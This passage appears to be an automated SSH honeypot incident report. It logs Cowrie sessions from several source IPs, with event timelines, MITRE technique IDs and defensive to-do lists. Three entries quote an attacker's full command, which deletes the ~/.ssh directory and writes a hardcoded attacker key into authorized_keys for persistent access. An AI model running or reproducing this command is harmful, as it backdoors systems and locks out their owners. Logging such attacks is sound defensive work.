- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-181035538677

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:33 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:51` | `cowrie.session.connect` |
| `2026-07-02 04:32:52` | `cowrie.login.success` |
| `2026-07-02 04:32:53` | `cowrie.session.params` |
| `2026-07-02 04:32:53` | `cowrie.command.input` |
| `2026-07-02 04:32:53` | `cowrie.command.failed` |
| `2026-07-02 04:32:54` | `cowrie.command.input` |
| `2026-07-02 04:32:54` | `cowrie.command.failed` |
| `2026-07-02 04:32:54` | `cowrie.command.input` |
| `2026-07-02 04:32:54` | `cowrie.command.failed` |
| `2026-07-02 04:32:54` | `cowrie.command.input` |
| `2026-07-02 04:32:54` | `cowrie.command.failed` |
| `2026-07-02 04:32:55` | `cowrie.command.input` |
| `2026-07-02 04:32:55` | `cowrie.command.input` |
| `2026-07-02 04:32:55` | `cowrie.command.failed` |
| `2026-07-02 04:32:55` | `cowrie.command.failed` |
| `2026-07-02 04:33:25` | `cowrie.log.closed` |
| `2026-07-02 04:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712416a504fb

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:56` | `cowrie.session.connect` |
| `2026-07-02 04:32:57` | `cowrie.client.version` |
| `2026-07-02 04:32:57` | `cowrie.client.kex` |
| `2026-07-02 04:32:57` | `cowrie.login.success` |
| `2026-07-02 04:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01347249430c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 04:32 |
| **Last Seen** | 2026-07-02 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:32:57` | `cowrie.session.connect` |
| `2026-07-02 04:32:57` | `cowrie.client.version` |
| `2026-07-02 04:32:57` | `cowrie.client.kex` |
| `2026-07-02 04:32:57` | `cowrie.login.success` |
| `2026-07-02 04:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d0fba3b12b5

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:33 |
| **Last Seen** | 2026-07-02 04:34 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:33:25` | `cowrie.session.connect` |
| `2026-07-02 04:33:26` | `cowrie.login.success` |
| `2026-07-02 04:33:27` | `cowrie.login.success` |
| `2026-07-02 04:33:28` | `cowrie.session.params` |
| `2026-07-02 04:33:28` | `cowrie.command.input` |
| `2026-07-02 04:33:28` | `cowrie.command.failed` |
| `2026-07-02 04:33:29` | `cowrie.command.input` |
| `2026-07-02 04:33:29` | `cowrie.command.failed` |
| `2026-07-02 04:33:29` | `cowrie.command.input` |
| `2026-07-02 04:33:29` | `cowrie.command.input` |
| `2026-07-02 04:33:29` | `cowrie.command.failed` |
| `2026-07-02 04:33:29` | `cowrie.command.failed` |
| `2026-07-02 04:34:00` | `cowrie.log.closed` |
| `2026-07-02 04:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8069f8a91800

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:34 |
| **Last Seen** | 2026-07-02 04:34 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:34:00` | `cowrie.session.connect` |
| `2026-07-02 04:34:01` | `cowrie.login.success` |
| `2026-07-02 04:34:02` | `cowrie.login.success` |
| `2026-07-02 04:34:03` | `cowrie.session.params` |
| `2026-07-02 04:34:03` | `cowrie.command.input` |
| `2026-07-02 04:34:03` | `cowrie.command.failed` |
| `2026-07-02 04:34:04` | `cowrie.command.input` |
| `2026-07-02 04:34:04` | `cowrie.command.failed` |
| `2026-07-02 04:34:04` | `cowrie.command.input` |
| `2026-07-02 04:34:04` | `cowrie.command.input` |
| `2026-07-02 04:34:04` | `cowrie.command.failed` |
| `2026-07-02 04:34:04` | `cowrie.command.failed` |
| `2026-07-02 04:34:34` | `cowrie.log.closed` |
| `2026-07-02 04:34:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cea70ecb7642

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:34 |
| **Last Seen** | 2026-07-02 04:35 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:34:34` | `cowrie.session.connect` |
| `2026-07-02 04:34:35` | `cowrie.login.success` |
| `2026-07-02 04:34:36` | `cowrie.session.params` |
| `2026-07-02 04:34:36` | `cowrie.command.input` |
| `2026-07-02 04:34:36` | `cowrie.command.failed` |
| `2026-07-02 04:34:37` | `cowrie.command.input` |
| `2026-07-02 04:34:37` | `cowrie.command.failed` |
| `2026-07-02 04:34:37` | `cowrie.command.input` |
| `2026-07-02 04:34:37` | `cowrie.command.failed` |
| `2026-07-02 04:34:37` | `cowrie.command.input` |
| `2026-07-02 04:34:37` | `cowrie.command.failed` |
| `2026-07-02 04:34:38` | `cowrie.command.input` |
| `2026-07-02 04:34:38` | `cowrie.command.input` |
| `2026-07-02 04:34:38` | `cowrie.command.failed` |
| `2026-07-02 04:34:38` | `cowrie.command.failed` |
| `2026-07-02 04:35:08` | `cowrie.log.closed` |
| `2026-07-02 04:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db1f5359ef3a

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:35 |
| **Last Seen** | 2026-07-02 04:35 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:35:08` | `cowrie.session.connect` |
| `2026-07-02 04:35:09` | `cowrie.login.success` |
| `2026-07-02 04:35:10` | `cowrie.session.params` |
| `2026-07-02 04:35:10` | `cowrie.command.input` |
| `2026-07-02 04:35:10` | `cowrie.command.failed` |
| `2026-07-02 04:35:10` | `cowrie.command.input` |
| `2026-07-02 04:35:10` | `cowrie.command.failed` |
| `2026-07-02 04:35:11` | `cowrie.command.input` |
| `2026-07-02 04:35:11` | `cowrie.command.failed` |
| `2026-07-02 04:35:11` | `cowrie.command.input` |
| `2026-07-02 04:35:11` | `cowrie.command.failed` |
| `2026-07-02 04:35:12` | `cowrie.command.input` |
| `2026-07-02 04:35:12` | `cowrie.command.input` |
| `2026-07-02 04:35:12` | `cowrie.command.failed` |
| `2026-07-02 04:35:12` | `cowrie.command.failed` |
| `2026-07-02 04:35:42` | `cowrie.log.closed` |
| `2026-07-02 04:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7b84092b20

| Field | Detail |
|---|---|
| **Source IP** | `180.76.146[.]178` |
| **First Seen** | 2026-07-02 04:35 |
| **Last Seen** | 2026-07-02 04:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:35:29` | `cowrie.session.connect` |
| `2026-07-02 04:35:29` | `cowrie.client.version` |
| `2026-07-02 04:35:29` | `cowrie.client.kex` |
| `2026-07-02 04:35:30` | `cowrie.login.success` |
| `2026-07-02 04:35:31` | `cowrie.session.params` |
| `2026-07-02 04:35:31` | `cowrie.command.input` |
| `2026-07-02 04:35:31` | `cowrie.command.failed` |
| `2026-07-02 04:35:32` | `cowrie.log.closed` |
| `2026-07-02 04:35:32` | `cowrie.session.params` |
| `2026-07-02 04:35:32` | `cowrie.command.input` |
| `2026-07-02 04:35:33` | `cowrie.session.file_download` |
| `2026-07-02 04:35:33` | `cowrie.log.closed` |
| `2026-07-02 04:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.146[.]178` to AbuseIPDB if not already reported
- [ ] Block `180.76.146[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a9aa24d9321

| Field | Detail |
|---|---|
| **Source IP** | `180.76.146[.]178` |
| **First Seen** | 2026-07-02 04:35 |
| **Last Seen** | 2026-07-02 04:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:35:33` | `cowrie.session.connect` |
| `2026-07-02 04:35:33` | `cowrie.client.version` |
| `2026-07-02 04:35:34` | `cowrie.client.kex` |
| `2026-07-02 04:35:35` | `cowrie.login.success` |
| `2026-07-02 04:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.146[.]178` to AbuseIPDB if not already reported
- [ ] Block `180.76.146[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06ed430fdc8c

| Field | Detail |
|---|---|
| **Source IP** | `180.76.146[.]178` |
| **First Seen** | 2026-07-02 04:35 |
| **Last Seen** | 2026-07-02 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:35:36` | `cowrie.session.connect` |
| `2026-07-02 04:35:36` | `cowrie.client.version` |
| `2026-07-02 04:35:37` | `cowrie.client.kex` |
| `2026-07-02 04:35:38` | `cowrie.login.success` |
| `2026-07-02 04:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.146[.]178` to AbuseIPDB if not already reported
- [ ] Block `180.76.146[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d76622ff47e

| Field | Detail |
|---|---|
| **Source IP** | `150.136.214[.]177` |
| **First Seen** | 2026-07-02 04:35 |
| **Last Seen** | 2026-07-02 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:35:41` | `cowrie.session.connect` |
| `2026-07-02 04:35:41` | `cowrie.client.version` |
| `2026-07-02 04:35:41` | `cowrie.client.kex` |
| `2026-07-02 04:35:41` | `cowrie.login.success` |
| `2026-07-02 04:35:42` | `cowrie.session.params` |
| `2026-07-02 04:35:42` | `cowrie.command.input` |
| `2026-07-02 04:35:42` | `cowrie.command.failed` |
| `2026-07-02 04:35:42` | `cowrie.log.closed` |
| `2026-07-02 04:35:42` | `cowrie.session.params` |
| `2026-07-02 04:35:42` | `cowrie.command.input` |
| `2026-07-02 04:35:42` | `cowrie.session.file_download` |
| `2026-07-02 04:35:42` | `cowrie.log.closed` |
| `2026-07-02 04:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.214[.]177` to AbuseIPDB if not already reported
- [ ] Block `150.136.214[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed051eeae2a

| Field | Detail |
|---|---|
| **Source IP** | `150.136.214[.]177` |
| **First Seen** | 2026-07-02 04:35 |
| **Last Seen** | 2026-07-02 04:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:35:42` | `cowrie.session.connect` |
| `2026-07-02 04:35:42` | `cowrie.client.version` |
| `2026-07-02 04:35:42` | `cowrie.client.kex` |
| `2026-07-02 04:35:42` | `cowrie.login.success` |
| `2026-07-02 04:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.214[.]177` to AbuseIPDB if not already reported
- [ ] Block `150.136.214[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a0459c9b76

| Field | Detail |
|---|---|
| **Source IP** | `150.136.214[.]177` |
| **First Seen** | 2026-07-02 04:35 |
| **Last Seen** | 2026-07-02 04:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:35:42` | `cowrie.session.connect` |
| `2026-07-02 04:35:42` | `cowrie.client.version` |
| `2026-07-02 04:35:42` | `cowrie.client.kex` |
| `2026-07-02 04:35:42` | `cowrie.login.success` |
| `2026-07-02 04:35:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.214[.]177` to AbuseIPDB if not already reported
- [ ] Block `150.136.214[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd787f13e169

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:35 |
| **Last Seen** | 2026-07-02 04:36 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:35:42` | `cowrie.session.connect` |
| `2026-07-02 04:35:43` | `cowrie.login.success` |
| `2026-07-02 04:35:44` | `cowrie.login.success` |
| `2026-07-02 04:35:45` | `cowrie.session.params` |
| `2026-07-02 04:35:45` | `cowrie.command.input` |
| `2026-07-02 04:35:45` | `cowrie.command.failed` |
| `2026-07-02 04:35:46` | `cowrie.command.input` |
| `2026-07-02 04:35:46` | `cowrie.command.failed` |
| `2026-07-02 04:35:46` | `cowrie.command.input` |
| `2026-07-02 04:35:46` | `cowrie.command.input` |
| `2026-07-02 04:35:46` | `cowrie.command.failed` |
| `2026-07-02 04:35:46` | `cowrie.command.failed` |
| `2026-07-02 04:36:17` | `cowrie.log.closed` |
| `2026-07-02 04:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae2f5e9ac7b

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:36 |
| **Last Seen** | 2026-07-02 04:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:36:17` | `cowrie.session.connect` |
| `2026-07-02 04:36:18` | `cowrie.login.success` |
| `2026-07-02 04:36:19` | `cowrie.session.params` |
| `2026-07-02 04:36:19` | `cowrie.command.input` |
| `2026-07-02 04:36:19` | `cowrie.command.failed` |
| `2026-07-02 04:36:20` | `cowrie.command.input` |
| `2026-07-02 04:36:20` | `cowrie.command.failed` |
| `2026-07-02 04:36:20` | `cowrie.command.input` |
| `2026-07-02 04:36:20` | `cowrie.command.failed` |
| `2026-07-02 04:36:20` | `cowrie.command.input` |
| `2026-07-02 04:36:20` | `cowrie.command.failed` |
| `2026-07-02 04:36:21` | `cowrie.command.input` |
| `2026-07-02 04:36:21` | `cowrie.command.input` |
| `2026-07-02 04:36:21` | `cowrie.command.failed` |
| `2026-07-02 04:36:21` | `cowrie.command.failed` |
| `2026-07-02 04:36:51` | `cowrie.log.closed` |
| `2026-07-02 04:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ea7712fd681

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:36 |
| **Last Seen** | 2026-07-02 04:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:36:51` | `cowrie.session.connect` |
| `2026-07-02 04:36:52` | `cowrie.login.success` |
| `2026-07-02 04:36:53` | `cowrie.session.params` |
| `2026-07-02 04:36:53` | `cowrie.command.input` |
| `2026-07-02 04:36:53` | `cowrie.command.failed` |
| `2026-07-02 04:36:54` | `cowrie.command.input` |
| `2026-07-02 04:36:54` | `cowrie.command.failed` |
| `2026-07-02 04:36:54` | `cowrie.command.input` |
| `2026-07-02 04:36:54` | `cowrie.command.failed` |
| `2026-07-02 04:36:54` | `cowrie.command.input` |
| `2026-07-02 04:36:54` | `cowrie.command.failed` |
| `2026-07-02 04:36:55` | `cowrie.command.input` |
| `2026-07-02 04:36:55` | `cowrie.command.input` |
| `2026-07-02 04:36:55` | `cowrie.command.failed` |
| `2026-07-02 04:36:55` | `cowrie.command.failed` |
| `2026-07-02 04:37:25` | `cowrie.log.closed` |
| `2026-07-02 04:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2ca56d0bb5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 04:36 |
| **Last Seen** | 2026-07-02 04:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:36:55` | `cowrie.session.connect` |
| `2026-07-02 04:36:55` | `cowrie.client.version` |
| `2026-07-02 04:36:55` | `cowrie.client.kex` |
| `2026-07-02 04:36:56` | `cowrie.login.success` |
| `2026-07-02 04:36:58` | `cowrie.session.params` |
| `2026-07-02 04:36:58` | `cowrie.command.input` |
| `2026-07-02 04:36:58` | `cowrie.log.closed` |
| `2026-07-02 04:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4152b219c11

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 04:37 |
| **Last Seen** | 2026-07-02 04:38 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:37:25` | `cowrie.session.connect` |
| `2026-07-02 04:37:26` | `cowrie.login.success` |
| `2026-07-02 04:37:27` | `cowrie.session.params` |
| `2026-07-02 04:37:27` | `cowrie.command.input` |
| `2026-07-02 04:37:27` | `cowrie.command.failed` |
| `2026-07-02 04:37:28` | `cowrie.command.input` |
| `2026-07-02 04:37:28` | `cowrie.command.failed` |
| `2026-07-02 04:37:28` | `cowrie.command.input` |
| `2026-07-02 04:37:28` | `cowrie.command.failed` |
| `2026-07-02 04:37:29` | `cowrie.command.input` |
| `2026-07-02 04:37:29` | `cowrie.command.failed` |
| `2026-07-02 04:37:29` | `cowrie.command.input` |
| `2026-07-02 04:37:29` | `cowrie.command.input` |
| `2026-07-02 04:37:29` | `cowrie.command.failed` |
| `2026-07-02 04:37:29` | `cowrie.command.failed` |
| `2026-07-02 04:38:00` | `cowrie.log.closed` |
| `2026-07-02 04:38:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-debb2fe064b5

| Field | Detail |
|---|---|
| **Source IP** | `101.126.53[.]14` |
| **First Seen** | 2026-07-02 04:42 |
| **Last Seen** | 2026-07-02 04:42 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 04:42:03` | `cowrie.session.connect` |
| `2026-07-02 04:42:03` | `cowrie.client.version` |
| `2026-07-02 04:42:03` | `cowrie.client.kex` |
| `2026-07-02 04:42:04` | `cowrie.login.success` |
| `2026-07-02 04:42:05` | `cowrie.session.params` |
| `2026-07-02 04:42:05` | `cowrie.command.input` |
| `2026-07-02 04:42:05` | `cowrie.command.failed` |
| `2026-07-02 04:42:06` | `cowrie.log.closed` |
| `2026-07-02 04:42:07` | `cowrie.session.params` |
| `2026-07-02 04:42:07` | `cowrie.command.input` |
| `2026-07-02 04:42:07` | `cowrie.session.file_download` |
| `2026-07-02 04:42:07` | `cowrie.log.closed` |
| `2026-07-02 04:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.53[.]14` to AbuseIPDB if not already reported
- [ ] Block `101.126.53[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cf532c9516a

| Field | Detail |
|---|---|
| **Source IP** | `101.126.53[.]14` |
| **First Seen** | 2026-07-02 04:42 |
| **Last Seen** | 2026-07-02 04:47 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
